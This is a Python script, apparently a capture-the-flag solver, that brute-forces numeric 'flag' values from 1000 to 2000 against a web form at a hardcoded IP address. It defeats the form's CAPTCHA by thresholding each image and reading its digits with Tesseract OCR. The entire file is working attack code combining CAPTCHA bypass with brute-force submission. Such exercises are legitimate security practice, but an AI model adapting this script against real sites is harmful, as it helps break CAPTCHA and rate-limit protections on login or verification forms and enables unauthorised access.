import requests
from PIL import Image
import pytesseract
from io import BytesIO

BASE_URL = "http://31.220.95.27:9002/captcha1/"
CAPTCHA_URL = "http://31.220.95.27:9002/captcha.php"

def lire_captcha(session):
    img_response = session.get(CAPTCHA_URL)
    image = Image.open(BytesIO(img_response.content))
    image = image.convert("L")
    image = image.point(lambda x: 255 if x > 128 else 0)
    texte = pytesseract.image_to_string(
        image,
        config="--psm 7 -c tessedit_char_whitelist=0123456789"
    ).strip()
    return texte

for flag in range(1000, 2001):
    session = requests.Session()
    session.get(BASE_URL)

    # Réessayer jusqu'à avoir un captcha valide
    for tentative in range(5):
        texte = lire_captcha(session)
        
        payload = {"flag": flag, "captcha": texte, "submit": "Submit"}
        result = session.post(BASE_URL, data=payload)

        if "Invalid captcha" in result.text:
            print(f"Flag {flag} | CAPTCHA invalide ('{texte}'), on réessaie...")
            continue  # Réessayer avec un nouveau captcha
        elif "Incorrect flag" in result.text:
            print(f"❌ Flag {flag} incorrect | CAPTCHA ok: {texte}")
            break  # CAPTCHA bon mais flag mauvais, passer au suivant
        else:
            print(f"✅ FLAG TROUVÉ : {flag} | CAPTCHA : {texte}")
            print(result.text)
            exit()
